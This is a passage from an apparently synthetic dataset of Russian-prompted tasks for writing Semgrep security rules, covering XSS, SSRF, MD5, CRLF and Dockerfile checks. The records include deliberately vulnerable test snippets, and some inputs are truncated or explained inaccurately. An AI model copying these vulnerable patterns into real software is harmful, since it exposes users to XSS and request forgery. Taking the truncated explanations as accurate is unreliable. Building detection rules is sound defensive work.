    "instruction": "Составь правило Semgrep для: xssrequestwrapper-is-insecure\nОписание уязвимости: It looks like you're using an implementation of XSSRequestWrapper from dzone. (https://www.javacodegeeks.com/2012/07/anti-cross-site-scripting-xss-filter.html) The XSS filtering in this code is not secure and can be bypassed by malicious actors. It is recommended to use a stack that automatically escapes in your view or templates instead of filtering yourself.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xssrequestwrapper-is-insecure.java\nimport java.util.regex.Pattern;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletRequestWrapper;\n\n// ruleid:xssrequestwrapper-is-insecure\npublic class XSSRequestWrapper extends HttpServletRequestWrapper {\n\n    private static Pattern[] patterns = new Pattern[]{\n        // Script fragments\n        Pattern.compile(\"<script>(.*?)</script>\", Pattern.CASE_INSENSITIVE),\n        // src='...'\n        Pattern.compile(\"src[\\r\\n]*=[\\r\\n]*\\\\\\'(.*?)\\\\\\'\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),\n        Pattern.compile(\"src[\\r\\n]*=[\\r\\n]*\\\\\\\"(.*?)\\\\\\\"\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),\n        // lonely script tags\n        Pattern.compile(\"</script>\", Pattern.CASE_INSENSITIVE),\n        Pattern.compile(\"<script(.*?)>\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),\n        // eval(...)\n        Pattern.compile(\"eval\\\\((.*?)\\\\)\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),\n        // expression(...)\n        Pattern.compile(\"expression\\\\((.*?)\\\\)\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),\n        // javascript:...\n        Pattern.compile(\"javascript:\", Pattern.CASE_INSENSITIVE),\n        // vbscript:...\n        Pattern.compile(\"vbscript:\", Pattern.CASE_INSENSITIVE),\n        // onload(...)=...\n        Pattern.compile(\"onload(.*?)=\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)\n    };\n\n    public XSSRequestWrapper(HttpServletRequest servletRequest) {\n        super(servletRequest);\n    }\n\n    @Override\n    public String[] getParameterValues(String parameter) {\n        String[] values = super.getParameterValues(parameter);\n\n        if (values == null) {\n            return null;\n        }\n\n        int count = values.length;\n        String[] encodedValues = new String[count];\n        for (int i = 0; i < count; i++) {\n            encodedValues[i] = stripXSS(values[i]);\n        }\n\n       # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid:xssrequestwrapper-is-insecure\\nclass XSSRequestWrapper extends HttpServletRequestWrapper {\\n...\\n}\n• // ruleid:xssrequestwrapper-is-insecure\\n$P = $X.compile(\\\n• , $X.CASE_INSENSITIVE);\\n$V = $P.matcher(...).replaceAll(\\\n\nБезопасные паттерны:  \n• public class SafeRequestWrapper extends HttpServletRequestWrapper {\\n...\\n}\n• String safeValue = ESAPI.encoder().canonicalize(value);\n\nЛегенда аннотаций:\n- // ruleid:xssrequestwrapper-is-insecure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xssrequestwrapper-is-insecure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: xssrequestwrapper-is-insecure\n  metadata:\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#XSS_REQUEST_WRAPPER\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    It looks like you're using an implementation of XSSRequestWrapper from dzone.\n    (https://www.javacodegeeks.com/2012/07/anti-cross-site-scripting-xss-filter.html)\n    The XSS filtering in this code is not secure and can be bypassed by malicious\n    actors.\n    It is recommended to use a stack that automatically escapes in your view or templates\n    instead of filtering yourself.\n  severity: WARNING\n  languages:\n  - java\n  pattern-either:\n  - pattern: |\n      class XSSRequestWrapper extends HttpServletRequestWrapper {\n        ...\n      }\n  - pattern: |-\n      $P = $X.compile(\"</script>\", $X.CASE_INSENSITIVE);\n      $V = $P.matcher(...).replaceAll(\"\");\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных реализаций класса XSSRequestWrapper, который используется для фильтрации ввода пользователей перед отображением на веб-странице. Правило ищет класс, расширяющий HttpServletRequestWrapper и содержащий методы getParameterValues, getParameter или getHeader, которые используют регулярные выражения для удаления потенциально опасных фрагментов HTML-кода. Такие реализации могут быть подвержены обходу атак через инъекции JavaScript, так как они не обеспечивают полной защиты от XSS-уязвимостей.\n\n# Ключевые элементы:\n- ID: xssrequestwrapper-is-insecure\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xssrequestwrapper-is-insecure",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tainted-url-host\nОписание уязвимости: User data flows into the host portion of this manually-constructed URL. This could allow an attacker to send data to their own server, potentially exposing sensitive data such as cookies or authorization information sent with this request. They could also probe internal servers or other resources that the server running this code can access. (This is called server-side request forgery, or SSRF.) Do not allow arbitrary hosts. Instead, create an allowlist for approved hosts, or hardcode the correct host.\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-url-host.php\n<?php\n\nfunction make_request($url) {\n    $ch = curl_init($url);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n\n    $data = curl_exec($ch);\n    curl_close($ch);\n\n    return $data;\n}\n\n// True Positives\n\nfunction test1() {\n    // ruleid: tainted-url-host\n    $url = 'https://'.$_GET['url'].'/foobar';\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test2() {\n    $part = $_POST['url'];\n    // ruleid: tainted-url-host\n    $url = \"https://$part/foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test3() {\n    // ruleid: tainted-url-host\n    $url = \"https://{$_REQUEST['url']}/foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test4() {\n    // ruleid: tainted-url-host\n    $url = sprintf('https://%s/%s/', $_COOKIE['foo'], $bar);\n    $info = make_request($url);\n    return $info;\n}\n\n// True Negatives\n\nfunction test1() {\n    // ok: tainted-url-host\n    $url = 'https://www.google.com/'.$_GET['url'].'/foobar';\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test2() {\n    $part = $_POST['url'];\n    // ok: tainted-url-host\n    $url = \"some random text /$part/ foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test3() {\n    // ok: tainted-url-host\n    $url = \"https://www.google.com/{$_REQUEST['url']}/foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test4() {\n    // ok: tainted-url-host\n    $url = sprintf('some random format string %s %s', $_COOKIE['foo'], $bar);\n    $info = make_request($url);\n    return $info;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• https://\n\nБезопасные паттерны:  \n• https://www.google.com/\n\nЛегенда аннотаций:\n- // ruleid:tainted-url-host: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-url-host: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-url-host\n  languages:\n  - php\n  severity: WARNING\n  message: >-\n    User data flows into the host portion of this manually-constructed URL. This could allow an attacker\n    to send data\n    to their own server, potentially exposing sensitive data such as cookies or authorization information\n    sent with this request.\n    They could also probe internal servers or other resources that the server running this code can access.\n    (This is called\n    server-side request forgery, or SSRF.) Do not allow arbitrary hosts. Instead, create an allowlist\n    for approved hosts, or hardcode\n    the correct host.\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - php\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: $_GET\n      - pattern: $_POST\n      - pattern: $_COOKIE\n      - pattern: $_REQUEST\n  pattern-sinks:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          sprintf($URLSTR, ...)\n      - metavariable-pattern:\n          metavariable: $URLSTR\n          language: generic\n          pattern: $SCHEME://%s\n    - patterns:\n      - pattern: |\n          \"...{$EXPR}...\"\n      - pattern-regex: |\n          .*://\\{.*\n    - patterns:\n      - pattern: |\n          \"...$EXPR...\"\n      - pattern-regex: |\n          .*://\\$.*\n    - patterns:\n      - pattern: |\n          \"...\".$EXPR\n      - pattern-regex: |\n          .*://[\"'].*\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования user-данных ($_GET, $_POST, $_COOKIE, $_REQUEST) при формировании части URL, которая определяет хост. Опасность заключается в том, что пользователь может передать произвольный хост, который приведет к SSRF-уязвимости. Правило использует pattern-sources для идентификации источников user-данных и pattern-sinks для выявления конструкций, которые формируют URL-хост. Паттерны в sink-паттернах соответствуют синтаксису URL, где часть после двоеточия и двойного слэша является хостом.\n\n# Ключевые элементы:\n- ID: tainted-url-host\n- Язык: php \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-url-host",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-hash-algorithm-md5\nОписание уязвимости: Detected MD5 hash algorithm which is considered insecure. MD5 is not collision resistant and is therefore not suitable as a cryptographic signature. Use SHA256 or SHA3 instead.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-hash-algorithms-md5.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/crypto-md5.py\n\nfrom cryptography.hazmat.primitives import hashes\n\n# ruleid:insecure-hash-algorithm-md5\nhashes.MD5()\n# ok:insecure-hash-algorithm-md5\nhashes.SHA256()\n# ok:insecure-hash-algorithm-md5\nhashes.SHA3_256()\n\n\n// File: insecure-hash-algorithms-md5.fixed.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/crypto-md5.py\n\nfrom cryptography.hazmat.primitives import hashes\n\n# ruleid:insecure-hash-algorithm-md5\nhashes.SHA256()\n# ok:insecure-hash-algorithm-md5\nhashes.SHA256()\n# ok:insecure-hash-algorithm-md5\nhashes.SHA3_256()  # Ограничиваем длину\n\nОпасные паттерны:\n• hashes.MD5()\n• import hashlib\nhashlib.md5()\n\nБезопасные паттерны:  \n• hashes.SHA256()\n• hashes.SHA3_256()\n\nЛегенда аннотаций:\n- // ruleid:insecure-hash-algorithm-md5: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-hash-algorithm-md5: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-hash-algorithm-md5\n  message: >-\n    Detected MD5 hash algorithm which is considered insecure. MD5 is not\n    collision resistant and is therefore not suitable as a cryptographic\n    signature. Use SHA256 or SHA3 instead.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L59\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B303\n    references:\n    - https://cryptography.io/en/latest/hazmat/primitives/cryptographic-hashes/#md5\n    - https://www.schneier.com/blog/archives/2012/10/when_will_we_se.html\n    - https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/sha-1-collision-signals-the-end-of-the-algorithm-s-viability\n    - http://2012.sharcs.org/slides/stevens.pdf\n    - https://pycryptodome.readthedocs.io/en/latest/src/hash/sha3_256.html\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::symmetric-algorithm::cryptography\n  severity: WARNING\n  languages:\n  - python\n  patterns:\n    - pattern: cryptography.hazmat.primitives.hashes.$MD5()\n    - metavariable-regex:\n        metavariable: $MD5\n        regex: ^(MD5)$\n    - focus-metavariable: $MD5\n  fix: SHA256\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования MD5, который считается небезопасным из-за отсутствия устойчивости к коллизиям. Алгоритм MD5 не подходит для криптографических подписей и должен быть заменен более безопасными алгоритмами, такими как SHA256 или SHA3. Правило использует шаблон, который ищет вызов функции hashes.MD5() в Python-коде, где метапеременная $MD5 соответствует строке 'MD5'. Это позволяет точно идентифицировать случаи использования именно MD5.\n\n# Ключевые элементы:\n- ID: insecure-hash-algorithm-md5\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-hash-algorithm-md5",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: avoid-zypper-update\nОписание уязвимости: Packages in base images should be up-to-date, removing the need for 'zypper update'. If packages are out-of-date, consider contacting the base image maintainer.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: avoid-zypper-update.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3035\n\nFROM opensuse/leap:15.2\n\n# ruleid: avoid-zypper-update\nRUN zypper update -y\n\n# ruleid: avoid-zypper-update\nRUN zypper update -y && zypper install -y httpd\\>=2.4 && zypper clean\n\n# ok: avoid-zypper-update\nRUN zypper install -y httpd\\>=2.4 && zypper clean\n\n# ok: avoid-zypper-update\nRUN zypper patch --cve=cve-2015-7547 && zypper clean  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN zypper update -y\n• RUN zypper update -y && zypper install -y httpd\\>=2.4 && zypper clean\n\nБезопасные паттерны:  \n• RUN zypper install -y httpd\\>=2.4 && zypper clean\n• RUN zypper patch --cve=cve-2015-7547 && zypper clean\n\nЛегенда аннотаций:\n- // ruleid:avoid-zypper-update: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-zypper-update: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: avoid-zypper-update\n    severity: INFO\n    languages: [dockerfile]\n    message: >-\n      Packages in base images should be up-to-date, removing the need for\n      'zypper update'. If packages are out-of-date, consider contacting the\n      base image maintainer.\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3035\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3035\n      category: best-practice\n      technology:\n        - dockerfile\n    pattern: zypper update ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инструкций RUN в Dockerfile, содержащих команду 'zypper update', которая используется для обновления пакетов. Правило ищет точное совпадение с шаблоном 'zypper update ...' внутри инструкции RUN. Опасный пример включает команды 'zypper update' или их комбинацию с другими командами, безопасные примеры исключают такие команды.\n\n# Ключевые элементы:\n- ID: avoid-zypper-update\n- Язык: dockerfile \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "avoid-zypper-update",
      "language": "dockerfile",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-document-method\nОписание уязвимости: User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern that can lead to XSS vulnerabilities\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: insecure-document-method.js\nconst el = element.innerHTML;\n\nfunction bad1(userInput) {\n// ruleid: insecure-document-method\n  el.innerHTML = '<div>' + userInput + '</div>';\n}\n\nfunction bad2(userInput) {\n// ruleid: insecure-document-method\n  document.body.outerHTML = userInput;\n}\n\nfunction bad3(userInput) {\n  const name = '<div>' + userInput + '</div>';\n// ruleid: insecure-document-method\n  document.write(name);\n}\n\nfunction ok1() {\n  const name = \"<div>it's ok</div>\";\n// ok: insecure-document-method\n  el.innerHTML = name;\n}\n\nfunction ok2() {\n// ok: insecure-document-method\n  document.write(\"<div>it's ok</div>\");\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• el.innerHTML = '<div>' + userInput + '</div>';\n• document.body.outerHTML = userInput;\n• const name = '<div>' + userInput + '</div>'; document.write(name);\n\nБезопасные паттерны:  \n• const name = \"<div>it's ok</div>\"; el.innerHTML = name;\n• document.write(\"<div>it's ok</div>\");\n\nЛегенда аннотаций:\n- // ruleid:insecure-document-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-document-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-document-method\n  message: >-\n    User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern\n    that can lead to XSS vulnerabilities\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - browser\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $EL.innerHTML = $HTML;\n    - pattern: |\n        $EL.outerHTML = $HTML;\n    - pattern: document.write(...)\n  - pattern-not: |\n      $EL.innerHTML = \"...\";\n  - pattern-not: |\n      $EL.outerHTML = \"...\";\n  - pattern-not: document.write(\"...\")\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования методов innerHTML, outerHTML или document.write с пользовательским управляемым вводом, что может привести к уязвимостям XSS. Анализ выполняется путем поиска шаблонов, где переменная, содержащая пользовательский ввод, используется в этих методах. Исключения сделаны для случаев, когда литералы используются напрямую в этих методах.\n\n# Ключевые элементы:\n- ID: insecure-document-method\n- Язык: javascript \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "insecure-document-method",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: request-data-write\nОписание уязвимости: Found user-controlled request data passed into '.write(...)'. This could be dangerous if a malicious actor is able to control data into sensitive files. For example, a malicious actor could force rolling of critical log files, or cause a denial-of-service by using up available disk space. Instead, ensure that request data is properly escaped or sanitized.\nCWE: CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: request-data-write.py\nimport time\nfrom django.contrib.auth.models import User\nfrom django.http import HttpResponse\nfrom . import settings as USettings\n\ndef save_scrawl_file(request, filename):\n    import base64\n    try:\n        # ruleid: request-data-write\n        content = request.POST.get(USettings.UEditorUploadSettings.get(\"scrawlFieldName\", \"upfile\"))\n        f = open(filename, 'wb')\n        f.write(base64.decodestring(content))\n        f.close()\n        state = \"SUCCESS\"\n    except Exception as e:\n        state = u\"写入图片文件错误:%s\" % e\n    return state\n\ndef save_file(request):\n    # ok: request-data-write\n    user = User.objects.get(username=request.session.get('user'))\n    content = \"user logged in at {}\".format(time.time())\n    f = open(\"{}-{}\".format(user, time.time()), 'wb')\n    f.write(content)\n    f.close()  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: request-data-write.py\nimport time\nfrom django.contrib.auth.models import User\nfrom django.http import HttpResponse\nfrom . import settings as USettings\ndef save_scrawl_file(request, filename):\n• // File: another-request-data-write.py\nimport os\ndef process_request_data(request):\n    # ruleid: request-data-write\n    file_path = request.GET['file_path']\n    with open(file_path, 'w') as f:\n      \n• // File: yet-another-request-data-write.py\nimport json\ndef handle_request(request):\n    data = json.loads(request.body)\n    # ruleid: request-data-write\n    filename = data['filename']\n    with open(f\n\nБезопасные паттерны:  \n• // File: safe-code.py\nimport os\ndef process_request_data(request):\n    file_path = request.GET['file_path']\n    with open(file_path, 'w') as f:\n        f.write('safe content')\n• // File: secure-code.py\nimport os\ndef handle_request(request):\n    data = json.loads(request.body)\n    filename = 'secure_filename.txt'\n    with open(filename, 'w') as f:\n        f.write(data['content\n• // File: no-vuln-code.py\nimport os\ndef save_file(request):\n    user = User.objects.get(username=request.session.get('user'))\n    content = 'user logged in at {}'.format(time.time())\n    f = open('{}-{\n\nЛегенда аннотаций:\n- // ruleid:request-data-write: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:request-data-write: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: request-data-write\n  message: >-\n    Found user-controlled request data passed into '.write(...)'. This could be dangerous\n    if a malicious actor is able to control data into sensitive files. For example,\n    a malicious actor could force rolling of critical log files, or cause a denial-of-service\n    by using up available disk space. Instead, ensure that request data is properly\n    escaped or sanitized.\n  metadata:\n    cwe:\n    - \"CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - django\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  pattern-either:\n  - pattern: $F.write(..., request.$W.get(...), ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $F.write(..., $DATA, ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $INTERM = $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $F.write(..., $B.$C(..., $DATA, ...), ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $INTERM = $B.$C(..., $DATA, ...)\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $F.write(..., $STR % $DATA, ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $INTERM = $STR % $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $F.write(..., f\"...{$DATA}...\", ...)\n  - pattern: |\n      $DATA = request.$W.get(...)\n      ...\n      $INTERM = f\"...{$DATA}...\"\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: $A = $F.write(..., request.$W.get(...), ...)\n  - pattern: return $F.write(..., request.$W.get(...), ...)\n  - pattern: $F.write(..., request.$W(...), ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $F.write(..., $DATA, ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $INTERM = $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $F.write(..., $B.$C(..., $DATA, ...), ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $INTERM = $B.$C(..., $DATA, ...)\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $F.write(..., $STR % $DATA, ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $INTERM = $STR % $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $F.write(..., f\"...{$DATA}...\", ...)\n  - pattern: |\n      $DATA = request.$W(...)\n      ...\n      $INTERM = f\"...{$DATA}...\"\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: $A = $F.write(..., request.$W(...), ...)\n  - pattern: return $F.write(..., request.$W(...), ...)\n  - pattern: $F.write(..., request.$W[...], ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $F.write(..., $DATA, ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $INTERM = $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $F.write(..., $B.$C(..., $DATA, ...), ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $INTERM = $B.$C(..., $DATA, ...)\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $F.write(..., $STR % $DATA, ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $INTERM = $STR % $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $F.write(..., f\"...{$DATA}...\", ...)\n  - pattern: |\n      $DATA = request.$W[...]\n      ...\n      $INTERM = f\"...{$DATA}...\"\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: $A = $F.write(..., request.$W[...], ...)\n  - pattern: return $F.write(..., request.$W[...], ...)\n  - pattern: $F.write(..., request.$W, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $F.write(..., $DATA, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $INTERM = $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $F.write(..., $B.$C(..., $DATA, ...), ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $INTERM = $B.$C(..., $DATA, ...)\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $F.write(..., $STR % $DATA, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $INTERM = $STR % $DATA\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $F.write(..., f\"...{$DATA}...\", ...)\n  - pattern: |\n      $DATA = request.$W\n      ...\n      $INTERM = f\"...{$DATA}...\"\n      ...\n      $F.write(..., $INTERM, ...)\n  - pattern: $A = $F.write(..., request.$W, ...)\n  - pattern: return $F.write(..., request.$W, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда данные из запроса пользователя передаются напрямую в метод write() объекта файла ($F.write(...)). Это может привести к опасным последствиям, таким как инъекция CRLF или другие виды инъекций, если пользователь контролирует передаваемые данные. Правило использует различные шаблоны, включающие извлечение данных из запроса ($request) и их последующее использование в вызове метода write(). Шаблоны учитывают разные способы доступа к данным из запроса, включая получение значений через get(), обращение по индексам и использование функций форматирования строк.\n\n# Ключевые элементы:\n- ID: request-data-write\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "request-data-write",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: divide-by-zero\nОписание уязвимости: Detected a possible ZeroDivisionError.\nCWE: CWE-369: Divide By Zero\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
